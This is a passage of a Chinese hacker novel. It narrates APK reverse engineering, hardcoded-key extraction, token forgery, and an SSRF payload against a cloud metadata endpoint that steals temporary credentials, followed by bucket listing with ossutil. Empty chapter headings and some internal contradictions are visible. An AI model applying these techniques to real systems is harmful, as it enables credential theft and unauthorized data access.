他先把指纹算出来核了一遍。

openssl s_client -connect 203.0.113.77:443 -servername relay-cn.example.top </dev/null 2>/dev/null | openssl x509 -noout -subject -issuer -fingerprint -sha256

出来的 SHA-256 跟列表上的一模一样。他又看签发者：跟六月那台构建机上被抓到的东西同一个中间证书。

然后他拿两个工具看这台机器的手势：

curl -s --resolve relay-cn.example.top:443:203.0.113.77 https://relay-cn.example.top/healthz -o /dev/null -w '%{http_code} %{time_total}\n'
python3 jarm.py relay-cn.example.top 443

状态码 200，握手时间零点二秒；JARM 指纹后八位跟他六月那份记录对得上。同一个软件栈，同一个配置习惯，同一个人。

他把这两条写进对照表第十一行，然后在备注栏里写了一句他很少写的话：**对面是一个人的活，不是一支队伍。一个人做三个项目、四家公司、六条管道，说明他缺人，也缺觉。**

缺觉的人会做错事。他把这句留着，等着用。

晚上他把要给罗锦的最后一条条件想清楚，发了过去：等那扇门被人从外面推的时候，你别拉闸，让它响。

回信比前几次都快。三个字：那就响。

他把这封回信存进档案，转头在笔记里单开一页，页眉写着两个字：交易。下面三行。一，门的位置已经不在我手上，在那份文档里。二，线路的指纹我核过了，是真的。三，她在替我挡一个我还没看见的东西。

第三行他写得比别的慢。这句不是事实，是判断，所以他换了一支笔画在右边一栏。这本笔记从第一页起就是两栏：左边写看见的，右边写以为的。写下判断不是问题，把判断写进左边那栏才是问题。

### 第 12 章

九月十一日，他接了一单不该接的活。

### 第 13 章

### 第 14 章

九月二十五日，他先做的不是打第七层，是看那三台机器在用什么。

路由器只能看连接，看不到内容。他需要知道他们用什么工具说事。这条路他选的是最钝的一条：那家公司的门牌底下印着一个二维码，扫出来是一个公众号，公众号里挂着一个安卓应用，说是“行业内部通讯”。

应用只有九兆。他把安装包从公众号的直链里拖下来，先算哈希，归档，再做一份副本。

apktool d -f comm-relay-3.8.2.apk -o apk_out
jadx -d jadx_out --show-bad-code comm-relay-3.8.2.apk

两套工具给的是同一个结果的两面：apktool 给他资源、清单和签名，jadx 给他读得懂的代码。他在清单里看到的第一个有意思的东西是网络配置：

android:networkSecurityConfig="@xml/network_security_config"

那份配置里写了两条：

<domain-config cleartextTrafficPermitted="false">
  <domain includeSubdomains="true">api.relay-mesh.top</domain>
  <pin-set expiration="2025-10-01">
    <pin digest="SHA-256">b3f1c0d9a7e5...=</pin>

也就是说这个应用只跟一个域名说话，而且做了证书固定。固定不是问题，固定说明写的人知道自己在防谁——防的就是坐在中间看流量的人。

他没有去碰固定，他去看了代码里怎么算请求。搜索字符串 relay-mesh，第一条命中在一个叫 ApiSigner 的类里。这个类做三件事：取时间戳、把参数按字典序拼起来、用 HMAC-SHA256 算一个签名。密钥是写在代码里的，一段四十四字符的 base64。

写在代码里的密钥跟写在纸上的密钥没区别。他把这段解出来，抄进笔记，然后把整个类重写成一个二十行的脚本。

要发请求还差一件事：对方查环境。应用里有一个检测，看手机是否 root、是否装了调试工具、代理是否被设置。他本来打算在真机上跑，但那台备用机没解锁，装不了自己的东西。他换了个思路——不装应用，直接照着签名规则造请求。三十行 Python，只依赖 requests 和 hmac。

第一次请求在二十三点十分发出去，返回 401。他去核对：时间戳用的是服务器时间，不是本机时间，偏差超过三十秒就拒。他把偏差改成从响应头里读的日期算。第二次发出去，返回 200。

接口不多，一共十七个。他按名字排了一遍，最下面一个叫 /api/v2/relay/nodes，权限要求是 admin。用普通账号的令牌去访问，返回 403。他没有去爆破权限，他去看那个令牌怎么来的。

令牌的签发接口有两个参数：账号和设备指纹。设备指纹的算法也在那个类里，是把十几个字段拼起来算 SHA-256，字段里包括 SIM 卡的序列号、机型、系统版本，还有一个 install_id。前三个他编不出来，最后一个可以——install_id 是应用第一次启动时随机生成的，服务端并不校验它跟别的字段的关系，只校验它是否存在于数据库里。

他注册了一个普通账号，把 install_id 抓出来，然后把要查的账号名填进去，设备指纹用对方自己的 install_id。签出来的令牌拿到手，权限是那个账号的权限。

第一批查的三个账号里，有两个能看到节点列表。

节点列表出来的时候他不看别的，只看结构。六个节点，每个节点有四个字段：名称、出口地址、承载业务、状态。承载业务那一栏写着的是他知道的名字——铭远、舟云、精工、动装，第二个和第三个字号比别的小，说明这两条是老的。

六个节点对应他六个域名、四家公司。这张列表就是他墙上那张表，只是写在别人服务器里。

他把列表整页存下来，接着往后翻了两页。第三页的标题是客户，一行一个编号，没有名字。每个编号后面挂着一列东西：需求类型、预算区间、交付方式。倒数第二行那个编号后面写着“标的一包”，预算栏的数字是七位数，状态栏显示“待确认”。

他盯着那行看了一会儿。他不知道那个包里装的是什么，但他知道位置：第几行。位置就是线索。

那天夜里他没有再动那个接口。他把笔记本翻到右边那栏，写了一句：他们卖的东西里有我。写完他把笔放下。这不是直觉，这是一条可以验证的判断，验证的办法就摆在那两页列表里。

他把那两页列表打印出来，夹进对照表的最后。然后做了一件他做过的、但从来没在这一行做过的事：他把自己写进了一条待办，待办的内容是“把我从那个包里拿出来”。

一个被人打包的东西不能算资产，只能算是货。他这几年一直避免成为货。

### 第 15 章

要动那个包，先要动放包的机器。

他手里的东西不多：一个能读节点列表的令牌，一本写了密钥的笔记，还有一个能看见第七层连接的路由器。这些都不足以碰到存储。他需要的是平台的凭据，平台的凭据通常不在应用里，在运行应用的那台机器上。

那条路他走了三天，第三天傍晚在一份接口文档里看到了门口。文档是他们自己给客户看的，公开挂着，里面列了十七个接口，比他摸到的多一个：/api/v2/webhook/test。说明写着“用于验证回调地址可达性”，示例参数是一个 URL。

一个让服务器替你访问任意 URL 的接口，本身就是一把钥匙。问题只剩两件事：它能不能访问内网，以及它把结果回不回给你。

第一件事他先试最简单的一个地址：

{"url": "http://127.0.0.1:8080/health"}

返回 200 和一段 JSON，内容是那个服务自己的健康检查。能访问本机，说明这个接口没有做地址过滤，只是把请求原样打出去。

第二件事他试的是元数据服务。云上跑的东西，最值钱的地址永远只有一个。他先试了老式的：

{"url": "http://100.100.100.200/latest/meta-data/"}

返回一串目录名。他挑了两层往下走：

那段 JSON 里有三个字段他认识：AccessKeyId、AccessKeySecret、SecurityToken。临时凭据，有效期一小时。一小时够他做很多事。

他没有立刻用凭据去翻存储，先做了一件事：从响应里挑出资源的区域和账号 ID，去查这个账号公开过的东西。查的结果是——这个账号下挂着一个 CDN、一个对象存储、和一个日志服务。三样都在用。

然后他用凭据列桶：

ossutil64 ls oss:// --access-key-id <AK> --access-key-secret <SK> --sts-token <TOKEN> -e oss-cn-hangzhou.aliyuncs.com

前两行是空的，第三行开始有东西。一共四个桶，名字都很平常：一个叫 static、一个叫 docs、一个叫 relay-backup、一个叫 archive-2024。

他从最小的那个开始看。docs 桶里是给客户看的材料，模板化的方案、报价、几份脱敏的日志截图。static 桶里是前端资源。relay-backup 桶里有东西：按日期分的文件夹，最近一个文件夹里有六个文件，其中三个是同一种结构的 JSON。

他把那三个文件拖下来，在本地解。第一个是节点快照，跟他从接口拿到的列表一模一样，只是多了每个节点的最后活动时间。第二个是账号表，十七个账号，每个账号一行权限位。第三个文件名是 pack-0713.json。

pack-0713 里有十九个编号。他扫到第十四个的时候停了下来。

编号下面有六行：一个名字的缩写、两个域名、一次入侵事件的时间、一个技术特征字符串、还有一句备注。名字的缩写是 CY，域名里有他那两个已经停掉的中转，时间是他进铭远那天，技术特征是他在那台服务器上留下的内存马的类名。

备注那句话他读了两遍：不宜接触，该标的具备反制能力，拟在第二阶段之后处理。

他靠回椅背，看着天花板上的灯管，看了一分钟。然后他做了一件很奇怪的事——他笑了。这不是高兴，是一种确认之后的松弛。他被人标了价，标价说明他能被卖。能被卖的东西，说明有人愿意买；愿意买，说明那个东西对某个人有分量。

他打开那个文件，没有删掉自己的那一页。他做了更细的一件事：把编号十四的那六行，跟他从接口拿到的那两页列表对齐，然后把对方六个节点的“承载业务”那一栏，一一对到 pack 文件里对应编号上。

对齐的结果很清楚。那个包里卖的不是数据，是管道。十九个编号里有七个跟节点列表里的六个加一个重叠，重叠的部分正好是最贵的那些。

他看了一眼时间，临时凭据还有二十七分钟。

接下来他做了两件留下痕迹的事。第一件，把 archive-2024 桶的清单拉下来，只拉清单，不拉内容。第二件，在 webhook 接口的日志里找自己：他数了数，三天里这个接口一共被调用过四百多次，其中三百多次的源地址是第七层，六十多次是香港，剩下十几次是谁他没查出来。

他把这两个数字抄进笔记，然后把凭据扔掉——不是删掉，是不再用。凭据是临时的，一小时后自己失效，这一点他信得过云。

回房间的时候是凌晨一点。他在右边那栏写了一行：包是给客户看的目录，真正的货还在仓库里。写完，他把笔记本翻到左边那栏，补了一句事实：对方的仓库有三个桶，我进去了一个，看了目录，没动货。

他停在这儿，没有往下走。越往后走越容易被记住，他已经在对方的台账上占了一个编号，不必再占第二条记录。

### 第 16 章

十月二日，钟先生回来了。这次不是一句话，是一份文件。

文件有五页，前三页是需求，后两页是报价。需求写得很干净：一家名叫临海通联的技术公司，做的是为收单机构提供清算技术支持的业务，客户方希望获得“清分环节的可见性与对账一致性验证能力”。报价那一栏的数字后面跟着四个零，付款方式分三次，第一笔在签的时候付。

三页里他都看懂了，只有一句话让他把纸放下来：客户要求“可编辑的二清对账文件样本”。

可见性不需要可编辑。可编辑意味着改，改意味着有一笔账要被人为地挪一格。

他没有立刻回。他先去看这家公司。

外网上几乎什么都没有：一个挂着公告的官网，一份三年前的年度报告，一个招聘页面。真正的面对内网里。他花了四天时间摸清了边上的东西：一套 Jenkins，版本落后，能匿名读到部分构建历史；几台运维跳板机，用的是堡垒机加短信双因素；一套 API 网关，网关后面是 Java 写的前置系统，再后面是那台真正重要的东西。

那台东西他只在两份文档的截图里见过：一台硬加密机。所有的密钥都在里面，报文送到它面前，由它盖章，盖完再往外走。

他专门去核了一遍这类系统的规矩。清算和收单的网络里跑的是 8583 格式的报文，一笔交易有网络管理、授权、通知、对账几类，报文里的域是有数的：主账号、处理码、金额、受理方标识、检索参考号、商户号、账户信息。授权和清分是两个时间点，中间隔着批量窗口，窗口里做的事叫做记账和净额。

也就是说，任何人想要挪一笔钱，不是改一条记录，是要让记账的净额跟上游发过来的对账文件对不上。对不上就会有人发现，发现的时间通常是第二天早上八点半，对账作业跑完的时候。

他坐在桌前把这件事想了很久。这不是技术问题，因为技术上他能做——这套东西的规矩很清楚，漏洞不在协议里，在人跟流程里。问题是这一单的后果跟他以前做的所有事都不一样：以前拿走的是纸，这一单动的是账。

账上的数字不是数据，是别人明天要买菜的钱。

第二天他给小满打电话，让她把那家公司的资产图单独做一份，标上所有能看到的东西。她做了三个小时，交上来，图上有一栏写着“对账窗口：每日 08:30 - 09:15”。他问她看出来什么了。

“看出来了。”她说，“如果他们改了东西，八点半就会有人发现。”

“对。”

“那你为什么还要算。”

他把电话贴在耳朵上，说了一句他想了很久的话：“我不算这一单。我算的是他们为什么觉得这一单会有人接。你想想，做这种活的人要么是手里有整套通道的团伙，要么是缺钱的。我们不是前者，我也不缺钱到那个程度。”

那头停了几秒。她说：“那你要退钱吗。”

“退。全退，另外加一句，往后这类目标不要再报过来。”

他给钟先生回了的只有一段话：这单我不接，定金原路退回；如果客户要做的只是对账一致性的验证，我可以出一份只读的核对方案，这个不要钱。

钟先生回得很快：你不用替我想，想想你自己。你手上那份东西，我这里有账。

他没回。

那晚他把那两页报价单烧了——真正的烧，用打火机，在阳台上，看着纸角上那条价格被火吃掉。烧完他把灰扫进垃圾袋，然后洗了手。

回到屋里，他打开笔记本，把这四天做的东西归到另一个文件夹里。他没有删掉，删掉等于承认自己怕了。他把它存好，起了个名字：不做。

存完之后他在左边那栏写了一行：通联清算，边界内可见，窗口 08:30-09:15，未越线。

右边那栏他写：钟先生急了。急的人会自己动手。

第二天他去了一趟通联清算所在的园区。他没进去，也没踩点，只是在对面的一家面馆坐了一个小时，看着上班的人从闸机进出。那些人的工牌颜色不一样，说明待遇不一样；有几个拎着电脑包的人走的是另一条通道，那条通道通向机房的货运电梯。

他吃完饭出来，把这个地址从手机备忘录里删掉。地址这种东西留着没有用，位置已经记住了，记住的东西不需要写下来。

晚上老纪打来电话问那单为什么退。他说了三个字：不划算。

老纪在电话里说，做这一行的人说“不划算”，十个里有九个是害怕，还有一个是看到了别的。你是哪一个。

“都不是。”他说，“我是懒得赔。”

十月六日他在阳台上站了半小时。楼下有人在遛狗，狗绳在路灯下晃。他忽然想起第一次进铭远那天晚上，他在机房里听到的那种声音——不是风扇，是UPS切换时继电器的一声轻响。他当时心跳很快，手是稳的。

现在手也是稳的。稳的原因不一样了。


那天夜里他睡得很沉。梦里没有机房，没有走廊，只有一条河，河水是黑的，水面很平。他在岸边走，手里拎着那个文件夹，文件夹上写着两个字。


他把那半张纸又捡回来看了看，纸上只剩下一行能认出来的字：结算方式。剩下全成了黑边。他把这半张也烧了。

### 第 17 章

周报是老纪转来的，一共九页，署名是一家做威胁情报的公司，公开挂在他们的官网上。

第七页有一段话被他读了三遍。

那一节讲的是一个“持续活跃的定向入侵团伙”，列了五条可以用于检测的特征：一条关于 JVM 内存马注入 Filter 链的 YARA 规则，一条关于 Windows 计划任务的持久化，一条关于 Clash 类工具的流量特征，两条关于历史事件的时间线。

那条 YARA 规则里写着两个字符串。一个是 svcCacheLoader，一个是 JvmFilterMem。

这两个字符串是他写的。不是别人写过一样的名字，是他自己起的名——第二版加载器那条，二〇二一年冬天，为了绕过某个国产防护产品的拦截，他把整个加载流程拆成两段，第二段才叫这个名字。这一版他只给过一个人。

那一节下面还附了三起事件的表：一家地市医院、一所职业学校、一家物流公司，最后一起的日期是九月十二日。

九月十二日，是他给汇通物流投递邮件之后的一整天。

他把周报打印出来，铺在桌上，用红笔在三起事件的时间上划了三条线。医院那起在八月，职校那起在九月上旬，物流那起在九月十二日。三起用的都是同一套东西，检测规则把三起串成了一条线，而那条线的末端指向一个名字。

不是他现在的名字，是他二〇二一年用过的那个 handle。周报里没写 handle，写的是“代号 C”。但做这一行的人看到那两条字符串，看一眼时间线，会有几个人能对上号，他不确定，但他知道至少有一个能对上——第七层那个人，或者钟先生。

他做的第一件事不是发火，是把清单列出来。

凡是他用过的、经过第三方之手的工件，一件一件列：加载器的两个版本、一个用于内网横向的批处理集合、一个打包工具、一份 API 签名脚本。列到第六件的时候他停下了。第六件是他自己重写的，只有他一个人碰过，那件不算。

五件。五件里有两件的特征是公开可查的，剩下三件只在两个人的手里出现过。

第二件事是核一遍那三起事件。他没有去碰任何一家的网络，他做的是把周报里的时间线、他自己知道的两件事、以及第七层那个包对起来。对起来的结果很干净：

那三起事件的落点，跟 pack-0713 那份十九个编号的列表不重合。也就是说，这些不是他客户列表上的目标，是另外一类目标——能上新闻、能立案、能被人记住的那一类。

第三件事他在凌晨做完了。他打开那个匿名信箱，写了第二封信，很短：

“你上周那份周报我看了。第七页那三起，不是一个人做的。第二个字符串我只给过一个人，那个人三个月前把手伸进了我的机器。我可以把两版加载器的样本给你，连同一个第三方交接的时间戳。条件是那三起别算我头上。”

写完他没有马上发。他把这句“条件是”删掉，重写成一个陈述句：

“样本我可以给，三份，带哈希和一份时间戳记录。是谁做的，你自己判断。”

发。

第四天早上回了。回信还是两行：

“样本给我。别的我自己判断。”

他把三份样本准备好。做这件事的时候他做了一件他平时不做的事：每一份样本都配上一条能复现的说明，写明样本会做什么、需要什么环境、在哪一步会落地、在哪一步会被 EDR 看见。他连“在哪一步会被拦下来”都写了。

写完这些，他坐在那儿看了很久。给一个蓝队工程师寄样本，等于是把他自己过去做过的东西，一件一件放到别人的显微镜下面。这些东西将来可以变成起诉材料，也可以变成一份别人无法反驳的技术记录。

他把文件打包，用一个新的一次性房间，密钥用 age 加密，密码单独一封邮件寄出去。上传。

那天下午他接了一个电话，是老纪打来的。老纪的声音听上去比平时慢。

“你听我说一件事。”老纪说，“今天有个中间人问我，临海这边有没有人接‘认领’的活。什么叫认领的活？就是有人做了事，需要有人把它认下来。”

“谁的事。”

“那三起。”老纪说，“中间人开的价很高。他说客户要的是一个能指认的名字，一个能摆在台面上的落点。你这个名字最近在外面被人提得有点勤。”

他没有说话。他这时候明白整件事的构造了：钟先生不是要他干活，是要他成为一个可以被指出来的东西——用来给那些做不干净的事的人的“事故”找一个出口。一个不干净的、有前科的名字，是最好用的出口。

“你打算怎么回他。”老纪问。

“不用回。”他说，“认领的活有人接，那接的人自己就会出事。让他们接。”

“那你怎么办。”

“我有三份样本在外面。”他说，“别人拿我的东西做事，我拦不住。但别人拿我的名字做事，这件事我拦得住。”

他说完这句话，把电话挂了。挂完之后他打开那本笔记本，在左边那栏写了一行：认领的活，中间人开价，客户要落点。

右边那栏他写：他们要的不是我，是一个名字。名字可以换，也可以变脏。

写完他把笔盖扣上，扣得很轻。

### 第 18 章

他给这件事定了一个名字：贴标签。

他不打算去报复任何人。报复要站在同一条线上，而他不打算站到那条线上去。他要做的是另一件事——把那件被人打包卖的东西，变成一件不好卖的东西。货卖不出去，卖货的人自己会着急，比任何人去动他都管用。

第一件事是撤掉那台耳朵。

十月十二日晚上十一点，越哥给他开了一次门。这一次走的是同一条路线，同一扇门，配线间里那台小路由器还在架子最底层，心跳灯一明一暗。他把笔记本接上去，做了三件事。

第一件，把三个月来的日志全导出来。这台机器上跑的是一套极简的记录程序，数据存成按天切分的文本：连接时间、来源地址、目的地址、字节数、会话长度。三个月一共十一万四千多条，压缩之后不到两兆。他没有筛，全拿走。

第二件，清掉它自己会说话的部分。日志清空、cron 里的拉起项删掉、管理账户改回默认、把机器的唯一序列号字段覆写成一段定长噪声。做完他执行了两次重启，确认重启之后它只会做一台普通路由器该做的事：拨号、转发、什么都不记。

第三件，他没有马上拔。他把机器留在原地，设了一个延时：四十八小时之后，如果它连着的那条线路还在，它会自己关掉管理口；如果在，它就正常地活着，混在机架上一堆线里谁也看不出来。这样处理的理由很简单——立刻拔掉会在对端的拓扑图上留下一个刚断的洞，谁都看得见；慢慢消失，谁都不会专门去找。

从配线间出来是凌晨零点四十。电梯里他靠着墙站，越哥在他旁边，两个人都没有说话。到一楼的时候越哥说了一句：“你这活干得干净。”他说：“干净是因为不想要了。”

第二件事是那份检测包。

他把三份样本、两份时间戳记录、一份他自己写的落点说明，整理成一份文件。里面没有一句评价，全是可验证的东西：样本的哈希、样本在什么环境下会做什么、会写哪个注册表项、会在哪个路径落文件、会在日志里留下什么特征。他还额外加了两个东西：一条 YARA 规则和一条 Sigma 规则，都是他写的，目的就是让这三份东西一进来就被看见。

写规则的时候他做了一件有点奇怪的事。他把自己二〇二一年那版加载器里最独特的那个字符串，原样写进了规则的条件里——就是周报上写着的那两个之一。写完他自己看了两遍，确认没有漏掉。

这意味着从今以后，任何用这套东西的人，第一次落地就会被检测到。这东西从此不再是资产，是负债。

他把这份文件投给那家情报公司的公开信箱。发件用的一次性邮箱，正文只有一句话：“第七页那三起，样本在这里。谁做的，你们自己判断。”

第三件事，最难，也最有分量。

他手里有七个数。三个来自 webhook 的日志，四个来自包里的编号，这七个数在两条不同的信道上互相印证：有人在什么时间、用什么地址、问过关于哪些节点的问题。他没有去查这七个数背后是谁，也没有去碰任何一个人的机器。他做的事情只是写。

他写了七封信。每一封都不一样，因为每一封里的事实都要跟收信人对得上：你知道的哪些是别人在用的、什么时候开始的、被谁看过。信里附了两个东西，一份是他整理的时间线，一份是自查用的只读命令——在收信人自己的网络上跑，看一眼自己那台设备最近六十天有没有异常的连接记录。

信的落款都是同一句：一个不想再被卖的人。

这七封信没有一封带威胁。他把“如果不停手”这种句子删得干干净净。原因不是心软，是因为写了恐吓就从技术说明变成了另一种东西，那种东西会被人拿去当证据，也会让收信人换成另一种应对方式。

第四件事轻得多。他给小满打了电话，让她把手上三张单全停三天，客户那边她自己说，理由随便找一个。她问为什么。

“有人在你那个网吧问过我的事。”

那头静了。“……你怎么知道。”

“你上礼拜给我那张表，最后一栏你写了‘问过了’。”他说，“以后有人问你，你就说你只见过我两次，一次在网吧问 SSRF，一次在楼下收快递。剩下的都不要说。”

“那我这三天干什么。”

“做一件事就行。把你自己的三套身份重排一遍。哪一套被人在纸上写过，哪一套就不要了。”

钟先生的电话是十月十七日晚上来的。这一次声音不是处理过的，是本人的声音，有点哑，语速比平时慢。

“你知道你在做什么。”

“知道。”他说，“我在给你卖的东西上贴标签。”

“你贴的标签，别人也认。”钟先生说，“那三起里面有你一半的东西。”

“有我前年的东西，没有我的时间。”他说，“而且从下周开始，那套东西谁用谁被看见。你找个买家试试。”

那头沉默了很久。他能听见对方的呼吸，很轻。然后钟先生说了一句很轻的话：“你会后悔的。”

“不会。”他说，“我在这一行学到的只有一件事：最贵的不是技术，是干净的时间。我现在花的就是干净的时间。”

他挂了电话，把手机放在桌上，打开那本笔记本。左边写：七封信，三个数来自日志，四个数来自包。右边写：两周内会有人找我，来的不会是他。

写完之后他把笔记本合上，去洗了个澡。洗到一半他忽然想起来一件事——第二封信里他写了一句“三份样本”，第三封信他写了“五个客户”，两个数字他没有在同一封信里对过。对不上才是对的：每一封只给一个人他本来就知道的那一部分。这是他这些年最有把握的一条手艺：不要让人看到比自己知道的更多的东西。
### 第 19 章

他把这句话写完，坐在椅子上没有动。窗外的路灯照进来，落在地板上是一块长方形。他看了那块光很久，然后起身，把房间里所有跟做活有关的东西都收进了柜子，只留下笔记本和一支笔。

收东西的时候他数了一遍：四个充电器、三根转接线、两块移动硬盘、一个装卡的铁盒。每一样他都拿起来看了一眼，再放进去。铁盒里那张卡他抽出来，用指甲刮掉了上面的编号。

老纪被叫去问话，一共两天。

第三天下午他给陈砚发了条消息，只有四个字：河边，老地方。

那是城东一条河的南岸，有一排石凳，对面是水厂的老围墙。老纪到的时候手里拎着一个塑料袋，袋子里是两个茶叶蛋。他坐下，剥了一个，另一个递给陈砚。

“问了我两天。”老纪说，“问的都是以前的事，问我认识哪些人，问我有没有帮人牵过线。他们手里有一张纸，纸上有一列名字，我的名字在第三个。”

“纸上有我么。”

“没有。”老纪说，“我也想过为什么没有。后来想明白了，你那批活从来没有从纸面上过。他们能查到的，是我这边现金的进出。”

陈砚咬了一口蛋，没说话。

“我这一行做了十七年。”老纪说，“以前我觉得自己是个送信的人。今天我想明白一件事，送信的人也是那条线上的一个环。我今天把那个本子撕了。”

“撕了几页。”

“全撕。”老纪说，“烧了。灰冲厕所里了。”

两个人看着河。九月的河水已经凉了，水面上漂着树叶，一簇一簇地打转。

“你接下来干什么。”老纪问。

“接着做。”陈砚说，“换一种做法。”

“哪种。”

“以前我做的事，是把别人的东西拿出来。”他说，“以后我要做的事，是先把东西拿出来的路封住，再谈钱。”

老纪笑了，笑得很短：“你这话听着像转行了。”

“没转。”他说，“手艺是一样的。只是以前我用它开门，以后我用它锁门。锁门比开门贵，也比开门稳。”

那天晚上他把手上所有资产重新排了一遍。这一次他做的是他从入行第一天就该做的事：隔离。

第一条，一个人的身份只服务一个客户，账户、邮箱、电话卡、付款通道各自独立，互相之间不许出现同一个登录指纹。第二条，任何一份密钥不许在两个地方出现——包括他自己的两个地方。他在第八十一章那次事故里学到的是这个，只是当时没做。第三条，所有基础设施设有效期，到期就换，不续，不延期，不管有没有出过事。

他排了三个小时，最后在一张纸上写出七个独立的口子，每一个后面写着它服务谁、什么时候到期、谁来管。第七个口子后面他写的是自己的名字。

钱分成三份。一份留着过日子，够两年。一份他没有留名，装在一个信封里，托老纪送到了某个县城的地址——那是老K家里的地址，也是他手上唯一还留着的老K的东西。老纪送完回了一句“送到了”，没有问为什么。第三份他花在一个域名上。

那个域名不指向任何服务。它上面只有一个静态页面，白色背景，一行黑字：这里什么都没有。

小满那边，她三天没有接单，第四天自己找上他，说想接一种新的活。他问她哪一种。她说：帮人查自己的门。

“内网体检。”他说，“要签合同，要写报告，要给人看得懂的话。这种活既没钱也慢。”

“我知道。”她说，“我想试试。”

他给了她三条规矩，写在电话里说的，让她自己抄在本子上。第一条，任何一次做活之前，先写下做完之后可能被别人拿到的东西是什么。第二条，报告里只能写你亲手复现过的东西，猜测要单独成段并且标明是猜测。第三条，永远不要做自己看不懂的那一步——看不懂不是慢，是风险。

她抄完把那三条念了一遍，一个字没有错。

越哥来是在月底。他把两个箱子放在桌上，一个是工具，一个是衣服。他说他接了一单，要去更远的地方，可能是外地，也可能不是。

“我们这行的人走到最后，手里的东西都会越来越少。”他说，“我这两个箱子，一个都是多余的。”

“带哪个走。”

“衣服。”越哥说，“工具留下。”

他走的时候跟陈砚握了手，握手很轻。陈砚看着他上出租车，蓝灯一闪，车并入主路，然后他就看不见了。

罗锦的第三封信是十月的最后一天到的。信里没有技术内容，只有一段话和一份附件。附件是一张时间线表，三个案子的关键节点都标出来了，最下面一行写着“证据链完整”。

那段话只有两句：“我把你给的东西和对面的记录对上了。现在我想问你一个问题：你打算怎么办。”

他回了三行：

“接着做。”

“规则全部重写过了，隔离、有效期、不共享。”

“下次你要找我，用这个信箱。它只服务你一个人。”

发出之后他把那台机器关了机，拔掉电源，把笔记本翻到今天这一页，在左边那栏写下：

资产清点：七个口子，一份两年期的钱，一个空域名，一个学徒，三条规定。

可以失去的，只有这间房子。

### 第 20 章

十一月四日下午，一个加密的一次性投递箱里出现了一份单子。

这个箱子不是他认识的任何渠道，是一个公开的匿名投递服务，任何人都能往里丢东西，丢完生成一个地址。他的地址是三天前才创建的，只用来收老客户的问询，全天下只有四个人知道。

单子很短。目标那一栏写着一个 handle——他二〇二一年用过的那个。要求那一栏写着四个字：指认落点。报价那一栏是一个七位数，正好是 pack-0713 里“标的一包”那个数字的三分之一。

最后附了一句：客户要的是一个能指认的名字。

他把这行字看了很久，然后笑了。这一回的笑跟以前不一样，是真的想笑。绕了一圈，他自己成了那单生意里的货。

接下来他做的是他最熟的一件事：看发单人。

投递箱的地址是一串无意义字符，看不出什么。但发单的人在箱子的说明页里留了一段技术备注，说是“为保证投递完整性，采用自定义签名校验”。那段备注里贴了六行示例代码。

六行，一个字节都不多。他看完那六行，坐直了。

拼接顺序是时间戳在前、参数按字典序在后、中间用竖线分隔，最后取 HMAC-SHA256 的前十六个字节做十六进制小写。这个顺序是他在二〇二一年定的，当时是为了让签名字符串长度稳定，避免被中间设备截断。他记得自己为什么选竖线，因为竖线在那个年代的设备上不会被转义。

这不是抄的人会抄出来的东西——抄的人抄的是接口，不会抄一个为了避免截断而定的分隔符。

他把这段代码跟他手里那份 APK 里的签名类对了一遍，对不上的地方有六处，全是小改：大小写、填充、错误返回。这些改动不是同一个人做的。这六处差异说明这个人拿到的不是完整的接口文档，是一份被拆开过的片段——也就是从老K那台机器上带走的那份东西，或者更早。

他把结论写下来，三行：

发单人持有二〇二一年版签名脚本的局部。
发单人不持有完整的接口实现。
发单人要的不是技术，是一个人。

他把这件事分成两半。

一半寄给罗锦，是第四封信。信里他只写事实：投递箱的地址、示例代码的六行、六处差异、以及一句判断——“这个人是你们在找的那条线上的人，他自己上门了。”他另外附了一件事：这次他没有要求交换任何东西，连条件都没提。

回信当天晚上到，比平时快。她回了三行：

“收到。”

“这个出口我们一直在看。三个月一百二十七次目录读取，九次落在临海。”

“你要接就接，接的过程中不要动他，剩下的交给我。”

第二部分是他自己的。

他建了一个全新的身份，从头到脚：一台租的机器、一张买来的卡、一个只在这一次用过的邮箱。他用这个身份回了单子，语气装得像一个接活多年、只看钱不看人的老手：标的可以先看，档案发过来，看完再谈价。

对面回了两个字：稍等。

三天后，档案到了。

他解压的时候手是很稳的。解出来的东西比 pack-0713 里那一页厚得多，一共十一页，前面九页是他自己知道的东西：两个旧域名、一个已经废掉的 handle、二〇二一年那次没做成的事、他在城南那栋楼里留下的那台机器的心跳间隔。第十页开始是他不知道有人知道的东西。

第十页第一条：他常去的那家便利店在楼下的营业时间是早上六点半到十一点半。

第十页第二条：他那台老笔记本的序列号，一个字符都没错——那台机器他只在家里用过，从来没连过外面的网。

第十一页是一张时间表，上面写着：每周四晚八点，南岸石凳。

最后一栏写着状态：待确认。

他放下手里的杯子，站起来，把窗户推开，又关上。屋里有一分钟是很安静的。然后他坐回去，重新看了一遍那张时间表。

他发现了一个问题：那张表上写的是“每周四晚八点”。老纪约他见面那天是周四，那天他到得比八点早。这个细节说明对方的记录不是实时跟出来的，是从别的地方拼出来的——其中有几次是真的，有几次是凑的。凑的部分说明这个人没有一直跟着他，只是拿到了可以拼出这套表的东西。

他没有害怕，他感到的是一种很清楚的确定：他被人写进了目录，还没被卖出去。状态那一栏写的是待确认，不是已完成。也就是说，买主还在等一个确认，而这个确认需要他做一件事——比如接下这单，比如去一个地方，比如回一句话。

他把档案里那十一页全部编号存好，两份拷贝。一份给了罗锦，附一句话：“这份档案可以立案，也可以让人进去。里面有两页是我家里的事，这部分你自己留着，不要交出去。”另一份他留在自己手里，用一个新的一次性房间，密码单独发。

然后他做了一件很轻的事。他给那个投递箱回了最后一封：标的我不碰。理由他不写。发完之后他把那个一次性邮箱注销掉，机器关机，卡取出来，用钳子剪成两半。

他去了蓝鲸网咖。小满在靠墙那台机器前写东西，屏幕上是一份刚起头的小型企业内网体检报告，页眉写着客户名，下面是范围、时间、授权方。她看见他，把椅子转过来。

“我第一页那两句话，现在回头看有点傻。”她说，“我想改。”

“哪句傻。”

“先想怎么被抓住，再想怎么做完。”她说，“我上个月做那单体检的时候发现，抓住我这件事从来不是我自己能算的。我算得再准，也可能有别人的东西在我的机器上。”

他看了她一会儿，然后从包里拿出自己的笔记本，翻到今天这一页，推过去。

左边那栏最后一行写着：清单更新，标的——我。状态：待确认，但不再由他们确认。

右边那栏只有三个字：下一位。

她看了一会儿，抬头问他：“这是什么意思。”

“意思是我这一行做了这么多年，第一次有人把我做成货。”他说，“我做了一件事：把货做成不好卖的。剩下的交给别人去算。”

“别人是谁。”

“一个不会把我卖掉的人。”

他把笔记本收起来。网咖里有人在打游戏，键盘声很密，空调在头顶上方响。他起身往外走的时候，回头说了一句话，声音不大，但她听见了。

“你的第一页可以留着。第二页写自己的规矩。”

